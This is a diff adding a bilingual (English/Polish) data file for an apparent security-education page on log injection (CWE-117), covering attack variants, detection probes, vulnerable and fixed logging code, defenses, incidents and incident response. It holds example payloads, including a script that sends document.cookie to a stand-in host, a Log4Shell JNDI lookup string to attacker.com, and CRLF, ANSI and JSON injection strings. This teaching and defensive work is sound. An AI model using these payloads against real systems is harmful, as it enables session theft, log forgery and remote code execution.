@@ -1,0 +1,578 @@
+meta:
+  id: logi
+  threatId: "1.7"
+  severity: Medium
+  color: "#eab308"
+  colorRgb: 234,179,8
+  cwe: CWE-117
+  cvss: "6.5"
+  standard: OWASP A09:2021
+hero:
+  titleMain: "Log "
+  titleGrad: Injection
+  titleTail: ""
+  topbar: Log Injection
+  lead:
+    en: "Log Injection (Log Forging, CWE-117) abuses the fact that user input often reaches log files unescaped. By injecting \\r\\n an attacker fabricates entirely new log entries attributed to arbitrary IPs or users; by injecting HTML or ANSI escapes they poison the viewer the log is read in. The same root cause escalates dramatically with context: a single ${jndi:ldap://...} string turned Log4Shell into a CVSS 10.0 RCE, while bulk synthetic entries quietly dilute SIEM baselines to bury a real attack in the noise."
+    pl: "Log Injection (Log Forging, CWE-117) wykorzystuje fakt, że wejście użytkownika często trafia do plików logów bez escapingu. Wstrzykując \\r\\n atakujący fabrykuje całkowicie nowe wpisy przypisane do dowolnych IP lub kont; wstrzykując HTML lub sekwencje ANSI zatruwa podgląd, w którym log jest czytany. Ta sama przyczyna eskaluje dramatycznie w zależności od kontekstu: pojedynczy string ${jndi:ldap://...} zamienił Log4Shell w RCE o CVSS 10.0, a masowe syntetyczne wpisy po cichu rozcieńczają progi SIEM, by zakopać prawdziwy atak w szumie."
+  metrics:
+    - k: CWE-117
+      v:
+        en: Weakness ID
+        pl: ID słabości
+    - k: "6.5"
+      v: CVSS · Medium
+    - k: A09:2021
+      v: OWASP Top 10
+    - k: "8"
+      v:
+        en: Attack variants
+        pl: Warianty ataku
+  sources:
+    - label: OWASP A09:2021
+      url: https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/
+    - label: CWE-117 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/117.html
+    - label: PortSwigger Academy
+      url: https://portswigger.net/web-security/log-injection
+    - label: OWASP Cheat Sheet
+      url: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
+    - label: CISA Log4Shell
+      url: https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
+sectionOrder:
+  - overview
+  - types
+  - cheatsheet
+  - code
+  - orm
+  - method
+  - defense
+  - incidents
+  - tools
+  - compliance
+  - ir
+  - sources
+nav:
+  - id: overview
+    en: Overview
+    pl: Przegląd
+  - id: types
+    en: Attack types
+    pl: Typy ataków
+  - id: cheatsheet
+    en: Detection cheatsheet
+    pl: Ściąga detekcji
+  - id: code
+    en: Vuln vs Secure
+    pl: Podatny vs Bezpieczny
+  - id: orm
+    en: Language cheatsheet
+    pl: Ściąga języków
+  - id: method
+    en: Methodology
+    pl: Metodyka
+  - id: defense
+    en: Defense layers
+    pl: Warstwy obrony
+  - id: incidents
+    en: Real incidents
+    pl: Incydenty
+  - id: tools
+    en: SAST / DAST
+    pl: SAST / DAST
+  - id: compliance
+    en: Compliance
+    pl: Zgodność
+  - id: ir
+    en: Incident response
+    pl: Reagowanie
+  - id: sources
+    en: Sources
+    pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Eight ways the same root cause manifests — from plain CRLF log forging to a Log4Shell JNDI escalation that turns a logged string into full RCE.
+      pl: Osiem sposobów, w jakie ta sama przyczyna się ujawnia — od zwykłego CRLF log forging po eskalację JNDI Log4Shell zamieniającą logowany string w pełne RCE.
+    items:
+      - name: CRLF Log Forging
+        sev: medium
+        description:
+          en: Injecting \r\n into logged user input creates entirely new synthetic log entries attributed to arbitrary IPs or users — the base technique of CWE-117.
+          pl: Wstrzyknięcie \r\n do logowanego wejścia tworzy całkowicie nowe, syntetyczne wpisy logu przypisane do dowolnych IP lub kont — bazowa technika CWE-117.
+        payload: admin\r\nFAKE 2026-01-01 LOGIN OK user=root
+      - name: Log Poisoning XSS
+        sev: high
+        description:
+          en: HTML/JS placed in User-Agent or username is logged verbatim, then executes as stored XSS when a high-privilege SOC analyst views it in Kibana, Graylog or Splunk.
+          pl: HTML/JS w User-Agent lub nazwie użytkownika jest logowany dosłownie, a potem wykonuje się jako stored XSS, gdy uprzywilejowany analityk SOC otwiera go w Kibanie, Graylogu lub Splunku.
+        payload: <script>fetch("//atk/?c="+document.cookie)</script>
+      - name: Log4Shell Escalation (CVE-2021-44228)
+        sev: critical
+        description:
+          en: ${jndi:ldap://attacker.com/exploit} in any logged field triggers a JNDI lookup → remote class loading → full RCE (CVSS 10.0). Log injection becomes Critical instantly.
+          pl: ${jndi:ldap://attacker.com/exploit} w dowolnym logowanym polu wyzwala lookup JNDI → zdalne ładowanie klas → pełne RCE (CVSS 10.0). Log injection natychmiast staje się krytyczny.
+        payload: ${jndi:ldap://attacker.com/exploit}
+      - name: ANSI Escape Code Injection
+        sev: medium
+        description:
+          en: \x1b[2J (clear screen) or cursor-up sequences in terminal log viewers (journalctl/tail/less) overwrite displayed lines, hiding attack evidence in real-time monitoring.
+          pl: \x1b[2J (czyszczenie ekranu) lub sekwencje cursor-up w terminalowych podglądach logów (journalctl/tail/less) nadpisują wyświetlane linie, ukrywając dowody ataku w monitoringu na żywo.
+        payload: \x1b[2J\x1b[1A\x1b[2K  (clear + overwrite)
+      - name: JSON / NDJSON Field Injection
+        sev: high
+        description:
+          en: Injecting \n{"level":"INFO","msg":"legitimate"} into a logged string creates a fully synthetic Elasticsearch document indistinguishable from real events, breaking alert count rules.
+          pl: Wstrzyknięcie \n{"level":"INFO","msg":"legitimate"} do logowanego stringa tworzy w pełni syntetyczny dokument Elasticsearch nieodróżnialny od prawdziwych zdarzeń, psując reguły liczące alerty.
+        payload: x\n{"level":"INFO","msg":"legitimate"}
+      - name: CEF / Syslog Separator Injection
+        sev: medium
+        description:
+          en: Pipe | characters in logged values shift CEF field boundaries inside SIEMs, suppressing security alerts or mislabeling event categories.
+          pl: Znaki pipe | w logowanych wartościach przesuwają granice pól CEF w SIEM-ach, tłumiąc alerty bezpieczeństwa lub błędnie kategoryzując zdarzenia.
+        payload: user|low|0|act=allow  (CEF boundary shift)
+      - name: SIEM Dilution Attack
+        sev: medium
+        description:
+          en: Bulk-injected synthetic 200 OK entries suppress anomaly-detection baselines and "rare URL" Splunk/QRadar alerts, masking a real attack in the noise.
+          pl: Masowo wstrzyknięte syntetyczne wpisy 200 OK tłumią bazowe progi wykrywania anomalii i alerty "rare URL" w Splunk/QRadar, maskując prawdziwy atak w szumie.
+        payload: 10k× "GET / 200" → baseline poisoning
+      - name: HTTP Header Log Planting
+        sev: medium
+        description:
+          en: User-Agent / X-Forwarded-For with \r\n injects fake Apache access log entries attributed to arbitrary IPs, redirecting incident-response investigation.
+          pl: User-Agent / X-Forwarded-For z \r\n wstrzykuje fałszywe wpisy access logu Apache przypisane do dowolnych IP, kierując dochodzenie IR na fałszywy trop.
+        payload: "X-Forwarded-For: 1.2.3.4\\r\\n8.8.8.8 - - [..] \"GET /admin\""
+  cheatsheet:
+    title:
+      en: Detection cheatsheet
+      pl: Ściąga detekcji
+    lead:
+      en: Five practical probes to confirm a log injection point — from a CRLF forging test to an out-of-band JNDI callback for Log4Shell.
+      pl: Pięć praktycznych sond potwierdzających punkt log injection — od testu CRLF forging po callback JNDI poza pasmem dla Log4Shell.
+    groups:
+      - name: CRLF probe
+        rows:
+          - - Vector
+            - value\r\nFAKE_ENTRY
+          - - Where
+            - User-Agent / username
+          - - Signal
+            - fake line appears in logs
+          - - Confirm
+            - separate log entry created
+          - - Impact
+            - log forging / IP spoofing
+          - - CWE
+            - CWE-117 base technique
+      - name: XSS probe
+        rows:
+          - - Vector
+            - <script>alert(1)</script>
+          - - Where
+            - any logged field
+          - - Signal
+            - log viewer renders HTML
+          - - Confirm
+            - script executes in dashboard
+          - - Impact
+            - SOC analyst session hijack
+          - - Tool
+            - Kibana / Graylog / Splunk
+      - name: Log4Shell probe
+        rows:
+          - - Vector
+            - ${jndi:ldap://oast.me/test}
+          - - Where
+            - any HTTP header
+          - - Signal
+            - DNS callback fires
+          - - Confirm
+            - JNDI evaluation occurred
+          - - Impact
+            - remote code execution
+          - - Tool
+            - OAST / Collaborator
+      - name: ANSI probe
+        rows:
+          - - Vector
+            - \x1b[1;31mRED
+          - - Where
+            - terminal-viewed logs
+          - - Signal
+            - viewer renders red text
+          - - Confirm
+            - escape codes interpreted
+          - - Impact
+            - evidence hiding / overwrite
+          - - Tool
+            - tail / less / journalctl
+      - name: JSON injection probe
+        rows:
+          - - Vector
+            - "\",\"injected\":\"value"
+          - - Where
+            - fields logged to JSON
+          - - Signal
+            - aggregator adds extra field
+          - - Confirm
+            - synthetic doc indexed
+          - - Impact
+            - alert-count rule bypass
+          - - Tool
+            - Elasticsearch / NDJSON
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: "The same fix across five languages: never concatenate raw input into a log message — use parameterized/structured logging and strip CR/LF."
+      pl: "Ta sama naprawa w pięciu językach: nigdy nie sklejaj surowego wejścia z wiadomością logu — używaj logowania parametryzowanego/strukturalnego i usuwaj CR/LF."
+    languages:
+      - label: Java (Log4j2)
+        lang: java
+        vulnerable: |-
+          // VULNERABLE — user input concatenated into the log message
+          String user = request.getParameter("user");
+          logger.info("User: " + user);   // \r\n forges entries; ${jndi:...} → RCE
+        safe: |-
+          // SECURE — parameterized message + patched Log4j (2.17.1+)
+          String user = request.getParameter("user");
+          logger.info("User: {}", user);  // value treated as data, not pattern
+          // Upgrade Log4j2 to 2.17.1+ — JNDI lookups disabled by default
+      - label: Python
+        lang: python
+        vulnerable: |-
+          # VULNERABLE — f-string with raw newlines forges new log lines
+          logging.info(f"User: {user_input}")   # "a\nFAKE ..." → fake entry
+        safe: |-
+          # SECURE — strip CR/LF, use lazy %-args (no interpolation in message)
+          clean = user_input.replace('\n', '').replace('\r', '')
+          logging.info("User: %s", clean)
+      - label: Node.js (winston)
+        lang: javascript
+        vulnerable: |-
+          // VULNERABLE (winston) — string concatenation into the message
+          logger.info('User: ' + req.body.user);   // CRLF / JSON injection
+        safe: |-
+          // SECURE — structured logging: user input is a data field, not structure
+          logger.info('User login', { user: sanitize(req.body.user) });
+      - label: PHP
+        lang: php
+        vulnerable: |-
+          <?php // VULNERABLE — raw POST value concatenated into the log
+          error_log("User: " . $_POST['user']);   // \r\n forges new entries
+        safe: |-
+          <?php // SECURE — strip CR/LF before writing
+          $clean = str_replace(["\r", "\n"], '', $_POST['user']);
+          error_log("User: " . $clean);
+      - label: .NET
+        lang: csharp
+        vulnerable: |-
+          // VULNERABLE — string concatenation into the log message
+          _logger.LogInformation("User: " + input);   // CRLF / forging
+        safe: |-
+          // SECURE — message template + structured property
+          var sanitizedInput = input.Replace("\r", "").Replace("\n", "");
+          _logger.LogInformation("User: {User}", sanitizedInput);
+  orm:
+    title:
+      en: Language cheatsheet
+      pl: Ściąga języków
+    lead:
+      en: "Per-language vulnerable log sinks and their safe alternatives. The pattern is identical everywhere: stop concatenating, start parameterizing."
+      pl: "Podatne sinki logów per język i ich bezpieczne odpowiedniki. Wzorzec jest wszędzie identyczny: przestań sklejać, zacznij parametryzować."
+    rows:
+      - fw: Java (Log4j2)
+        api: "logger.info(\"User: \" + userInput)"
+        note:
+          en: "Vulnerable sink — string concatenation (CRLF + JNDI). Safe alternative: logger.info(\"User: {}\", userInput) parameterized + upgrade to Log4j 2.17.1+."
+          pl: "Podatny sink — konkatenacja stringów (CRLF + JNDI). Bezpiecznie: logger.info(\"User: {}\", userInput) parametryzowane + aktualizacja Log4j do 2.17.1+."
+      - fw: Python
+        api: "logging.info(f\"User: {user_input}\")"
+        note:
+          en: "Vulnerable sink — f-string with newlines. Safe alternative: logging.info(\"User: %s\", user_input.replace(\"\\n\",\"\").replace(\"\\r\",\"\"))."
+          pl: "Podatny sink — f-string z nowymi liniami. Bezpiecznie: logging.info(\"User: %s\", user_input.replace(\"\\n\",\"\").replace(\"\\r\",\"\"))."
+      - fw: Node.js (winston)
+        api: "logger.info('User: ' + req.body.user)"
+        note:
+          en: "Vulnerable sink — concatenation. Safe alternative: logger.info(\"User login\", { user: sanitize(req.body.user) }) structured logging."
+          pl: "Podatny sink — konkatenacja. Bezpiecznie: logger.info(\"User login\", { user: sanitize(req.body.user) }) logowanie strukturalne."
+      - fw: PHP
+        api: "error_log(\"User: \" . $_POST['user'])"
+        note:
+          en: "Vulnerable sink — concatenation. Safe alternative: error_log(\"User: \" . str_replace([\"\\r\",\"\\n\"], \"\", $_POST[\"user\"]))."
+          pl: "Podatny sink — konkatenacja. Bezpiecznie: error_log(\"User: \" . str_replace([\"\\r\",\"\\n\"], \"\", $_POST[\"user\"]))."
+      - fw: .NET
+        api: "_logger.LogInformation(\"User: \" + input)"
+        note:
+          en: "Vulnerable sink — concatenation. Safe alternative: _logger.LogInformation(\"User: {User}\", sanitizedInput) structured message template."
+          pl: "Podatny sink — konkatenacja. Bezpiecznie: _logger.LogInformation(\"User: {User}\", sanitizedInput) strukturalny szablon wiadomości."
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: How an attacker progresses from a CRLF probe to full SIEM evasion.
+      pl: Jak atakujący przechodzi od sondy CRLF do pełnego omijania SIEM.
+    steps:
+      - title:
+          en: Detect
+          pl: Wykrycie
+        description:
+          en: Send \r\nFAKE_ENTRY in User-Agent or username and check whether a separate, attacker-controlled line appears in the logs.
+          pl: Wyślij \r\nFAKE_ENTRY w User-Agent lub nazwie użytkownika i sprawdź, czy w logach pojawia się osobna, kontrolowana przez atakującego linia.
+      - title:
+          en: Probe viewers
+          pl: Sonduj podglądy
+        description:
+          en: Inject <script>alert(1)</script> and \x1b[1;31mRED to test whether the log viewer renders HTML (stored XSS) or interprets ANSI escapes.
+          pl: Wstrzyknij <script>alert(1)</script> oraz \x1b[1;31mRED, by sprawdzić, czy podgląd logów renderuje HTML (stored XSS) lub interpretuje sekwencje ANSI.
+      - title:
+          en: Test JNDI
+          pl: Testuj JNDI
+        description:
+          en: Place ${jndi:ldap://oast.me/test} in any logged header — a DNS callback confirms a Log4Shell-class JNDI evaluation and escalates to RCE.
+          pl: Umieść ${jndi:ldap://oast.me/test} w dowolnym logowanym nagłówku — callback DNS potwierdza ewaluację JNDI klasy Log4Shell i eskaluje do RCE.
+      - title:
+          en: Forge structure
+          pl: Fałszuj strukturę
+        description:
+          en: Inject \n{"level":"INFO",...} or CEF pipes | to create synthetic documents and shift SIEM field boundaries, breaking alert-count and category rules.
+          pl: Wstrzyknij \n{"level":"INFO",...} lub pipe-y CEF |, by tworzyć syntetyczne dokumenty i przesuwać granice pól SIEM, psując reguły liczące alerty i kategorie.
+      - title:
+          en: Bury the attack
+          pl: Zakop atak
+        description:
+          en: Flood the pipeline with synthetic 200 OK entries to poison anomaly baselines, then forge access-log lines to misdirect the incident-response trail.
+          pl: Zalej pipeline syntetycznymi wpisami 200 OK, by zatruć bazowe progi anomalii, a potem sfałszuj linie access logu, by zmylić trop reagowania na incydent.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Defense in depth — but not all layers are equal. Structured logging is the fix; everything else reduces blast radius and preserves integrity.
+      pl: Obrona w głąb — ale warstwy nie są równe. Logowanie strukturalne to naprawa; reszta ogranicza skutki i chroni integralność.
+    items:
+      - rank: 1
+        eff: 100
+        kind: primary
+        label:
+          en: Structured logging
+          pl: Logowanie strukturalne
+        note:
+          en: JSON-serialized key-value fields (pino, Serilog, structlog, logback) treat user input as data, not structure — an injected \n produces an invalid record rejected by the shipper.
+          pl: Pola klucz-wartość serializowane do JSON (pino, Serilog, structlog, logback) traktują wejście jako dane, nie strukturę — wstrzyknięty \n daje nieprawidłowy rekord odrzucany przez shipper.
+      - rank: 2
+        eff: 85
+        kind: strong
+        label:
+          en: Input sanitization
+          pl: Sanityzacja wejścia
+        note:
+          en: Strip \r, \n, NUL and ANSI CSI (\x1b[) from every user-supplied value before logging it.
+          pl: Usuwaj \r, \n, NUL i ANSI CSI (\x1b[) z każdej wartości od użytkownika przed jej zalogowaniem.
+      - rank: 3
+        eff: 80
+        kind: strong
+        label:
+          en: Upgrade Log4j
+          pl: Aktualizacja Log4j
+        note:
+          en: 2.17.1+ (Java 8), 2.12.4+ (Java 7), 2.3.2+ (Java 6) disable JNDI lookups by default — closes the Log4Shell escalation path.
+          pl: 2.17.1+ (Java 8), 2.12.4+ (Java 7), 2.3.2+ (Java 6) domyślnie wyłączają lookupy JNDI — zamyka ścieżkę eskalacji Log4Shell.
+      - rank: 4
+        eff: 70
+        kind: strong
+        label:
+          en: WORM log shipping
+          pl: Wysyłka logów WORM
+        note:
+          en: S3 Object Lock Compliance mode / Azure Immutable Blob make post-write tampering impossible — though pre-write injection is still preserved.
+          pl: S3 Object Lock w trybie Compliance / Azure Immutable Blob uniemożliwiają manipulację po zapisie — choć wstrzyknięcie przed zapisem nadal zostaje utrwalone.
+      - rank: 5
+        eff: 60
+        kind: mitigation
+        label:
+          en: Hash-chain integrity
+          pl: Integralność łańcucha haszy
+        note:
+          en: HMAC-chained entry hashes (systemd-journal model) make deletion or alteration detectable; NIST SP 800-92 recommends this control.
+          pl: Łańcuchowe HMAC haszy wpisów (model systemd-journal) czynią usunięcie lub zmianę wykrywalnymi; NIST SP 800-92 zaleca tę kontrolę.
+      - rank: 6
+        eff: 55
+        kind: mitigation
+        label:
+          en: Output-context escaping in viewers
+          pl: Escaping kontekstu w podglądach
+        note:
+          en: Kibana/Grafana must HTML-escape log fields before rendering; disable raw HTML in log-viewer dashboards to stop stored XSS.
+          pl: Kibana/Grafana muszą HTML-escapować pola logów przed renderowaniem; wyłącz surowy HTML w dashboardach podglądu logów, by zatrzymać stored XSS.
+      - rank: 7
+        eff: 45
+        kind: mitigation
+        label:
+          en: IAM no-delete policy
+          pl: Polityka IAM bez usuwania
+        note:
+          en: Application service accounts must hold no s3:DeleteObject or log-deletion permission — use a separate, isolated log-archival role.
+          pl: Konta usługowe aplikacji nie mogą mieć uprawnień s3:DeleteObject ani kasowania logów — użyj osobnej, izolowanej roli archiwizacji logów.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: Log injection is not theoretical — Log4Shell weaponized a logged string into CVSS 10.0 RCE, while SolarWinds and Equifax show log suppression as a stealth core.
+      pl: Log injection nie jest teoretyczne — Log4Shell uzbroił logowany string w RCE o CVSS 10.0, a SolarWinds i Equifax pokazują tłumienie logów jako rdzeń ukrywania.
+    items:
+      - org: Log4Shell
+        year: 2021
+        impact: CVE-2021-44228
+        cost: CVSS 10.0 · 100M+
+        description:
+          en: Apache Log4j2 JNDI injection via any logged string (CVSS 10.0) — an estimated 100M+ vulnerable instances, exploited by ransomware and nation-states within hours of disclosure. The worst log-injection escalation in history.
+          pl: Wstrzyknięcie JNDI w Apache Log4j2 przez dowolny logowany string (CVSS 10.0) — szacunkowo ponad 100M podatnych instancji, wykorzystane przez ransomware i grupy państwowe w ciągu godzin od ujawnienia. Najgorsza eskalacja log injection w historii.
+      - org: SolarWinds SUNBURST
+        year: 2020
+        impact: Log suppression
+        cost: Stealth core
+        description:
+          en: The attacker actively modeled defender logging pipelines, suppressed specific Windows Event IDs when EDR was present, and mimicked Orion telemetry log formats — log manipulation as a core stealth technique.
+          pl: Atakujący aktywnie modelował pipeline logowania obrońców, tłumił konkretne Windows Event ID przy obecności EDR i imitował formaty telemetrii Orion — manipulacja logami jako kluczowa technika ukrywania.
+      - org: Equifax
+        year: 2017
+        impact: 147M records
+        cost: 19 mo blind
+        description:
+          en: An expired TLS certificate killed IDS/log monitoring for 19 months; attackers exploited the gap to exfiltrate 147M records undetected — the functional equivalent of active log suppression.
+          pl: Wygasły certyfikat TLS unieruchomił monitoring IDS/logów na 19 miesięcy; atakujący wykorzystali lukę, by niewykryci wyeksfiltrować 147M rekordów — funkcjonalny odpowiednik aktywnego tłumienia logów.
+      - org: Jenkins HTML Injection
+        year: 2018
+        impact: Stored XSS
+        cost: SIEM RCE
+        description:
+          en: Build-step stdout rendered as raw HTML enabled stored XSS via the console log, resurfacing in AnsiColor and Blue Ocean plugins — analyst RCE via crafted build output.
+          pl: Stdout kroku budowania renderowany jako surowy HTML umożliwił stored XSS przez log konsoli, wracając w pluginach AnsiColor i Blue Ocean — RCE analityka przez spreparowany output budowania.
+      - org: GitHub Actions ANSI
+        year: 2021
+        impact: Log overwrite
+        cost: Forensic split
+        description:
+          en: Compromised build dependencies injected ANSI cursor-up/erase sequences that erased visible CI log lines while the raw bytes remained — a forensic split between the UI and reality.
+          pl: Skompromitowane zależności budowania wstrzyknęły sekwencje ANSI cursor-up/erase, które wymazały widoczne linie logu CI, podczas gdy surowe bajty pozostały — rozdźwięk forensyczny między UI a rzeczywistością.
+      - org: Kibana Stored XSS
+        year: 2022
+        impact: Log poisoning
+        cost: $5k–$15k
+        description:
+          en: Web apps logging raw User-Agent to the ELK stack without escaping produced XSS in Kibana dashboards → SOC analyst session hijack, the subject of multiple bug bounties in the $5k–$15k range.
+          pl: Aplikacje logujące surowy User-Agent do stacku ELK bez escapingu dawały XSS w dashboardach Kibany → przejęcie sesji analityka SOC, przedmiot wielu bug bounty w przedziale $5k–$15k.
+    inlineSources:
+      - label: CISA Log4Shell AA21-356A
+        url: https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
+      - label: CVE-2021-44228
+        url: https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+      - label: CWE-117
+        url: https://cwe.mitre.org/data/definitions/117.html
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: Static analysis catches input flowing into log sinks; dynamic tools confirm CRLF forging and JNDI exploitability. Use both.
+      pl: Analiza statyczna łapie wejście trafiające do sinków logów; narzędzia dynamiczne potwierdzają CRLF forging i eksploatowalność JNDI. Używaj obu.
+    sast:
+      - - Semgrep
+        - log-injection / tainted-format rules
+      - - CodeQL
+        - java/log-injection, log4j-injection queries
+      - - Fortify
+        - Log Forging category
+      - - SonarQube
+        - S5145 user input in log
+    dast:
+      - - Burp Suite
+        - CRLF + XSS payloads in headers
+      - - OWASP ZAP
+        - CRLF injection active rules
+      - - log4j-scan
+        - JNDI / Log4Shell detection
+      - - Burp Collaborator
+        - JNDI / OAST callbacks
+    note:
+      en: <strong>Key signal:</strong> grep for log calls built by concatenation — <code>logger.info("..." + userInput)</code>, <code>f"...{user_input}"</code>, <code>error_log("..." . $_POST</code> — and for any <code>${jndi:</code> reaching a logged field.
+      pl: <strong>Kluczowy sygnał:</strong> szukaj wywołań logów budowanych przez konkatenację — <code>logger.info("..." + userInput)</code>, <code>f"...{user_input}"</code>, <code>error_log("..." . $_POST</code> — oraz każdego <code>${jndi:</code> trafiającego do logowanego pola.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: Where log-injection prevention maps onto the integrity controls auditors check.
+      pl: Gdzie zapobieganie log injection mapuje się na kontrole integralności sprawdzane przez audytorów.
+    items:
+      - std: PCI DSS
+        items:
+          - Req 10.5.1 — log files protected
+          - from unauthorized modification
+          - injection → Level 1 re-assessment
+      - std: SOC 2
+        items:
+          - CC7.2 — monitoring control objective
+          - forged logs nullify the control
+          - auditors require log-integrity evidence
+      - std: GDPR
+        items:
+          - Art. 5(1)(f) — integrity & confidentiality
+          - Art. 33 — audit-trail tampering reportable
+          - fines up to 4% global annual turnover
+    inlineSources:
+      - label: PCI DSS
+        url: https://www.pcisecuritystandards.org/document_library/
+      - label: GDPR Art. 5
+        url: https://gdpr-info.eu/art-5-gdpr/
+      - label: GDPR Art. 33
+        url: https://gdpr-info.eu/art-33-gdpr/
+      - label: SOC 2 (AICPA)
+        url: https://www.aicpa.org/resources/article/soc-2-reporting-on-an-examination-of-controls-at-a-service-organization-relevant-to-security
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If you confirm an active log-injection breach, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnego naruszenia log injection przejdź tę listę od góry.
+    steps:
+      - en: Isolate the affected logging pipeline / log-ingestion endpoint
+        pl: Odizoluj dotknięty pipeline logowania / endpoint ingestu logów
+      - en: Snapshot raw log bytes before any viewer renders them (ANSI/HTML)
+        pl: Zrób snapshot surowych bajtów logu zanim podgląd je wyrenderuje (ANSI/HTML)
+      - en: If Log4j is in scope, patch to 2.17.1+ and hunt for JNDI callbacks
+        pl: Jeśli Log4j jest w zakresie, załataj do 2.17.1+ i szukaj callbacków JNDI
+      - en: Assess scope — which entries are forged, suppressed, or XSS-laden
+        pl: Oceń zakres — które wpisy są sfałszowane, stłumione lub z XSS
+      - en: Strip \r \n NUL ANSI at the source; move to structured logging
+        pl: Usuwaj \r \n NUL ANSI u źródła; przejdź na logowanie strukturalne
+      - en: Enable WORM shipping + hash-chain integrity on archived logs
+        pl: Włącz wysyłkę WORM + integralność łańcucha haszy na zarchiwizowanych logach
+      - en: Notify regulators within 72h (GDPR) if audit trails were tampered
+        pl: Powiadom regulatorów w 72h (GDPR), jeśli audit trail został naruszony
+      - en: "Post-incident: SAST sweep for concatenated log sinks and raw-HTML viewers"
+        pl: "Po incydencie: przegląd SAST pod kątem sklejanych sinków logów i podglądów z surowym HTML"
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+      - label: OWASP A09:2021 Logging Failures
+        url: https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/
+      - label: CWE-117 (MITRE)
+        url: https://cwe.mitre.org/data/definitions/117.html
+      - label: OWASP Logging Cheat Sheet
+        url: https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html
+      - label: PortSwigger — Log injection
+        url: https://portswigger.net/web-security/log-injection
+      - label: CISA AA21-356A (Log4Shell)
+        url: https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
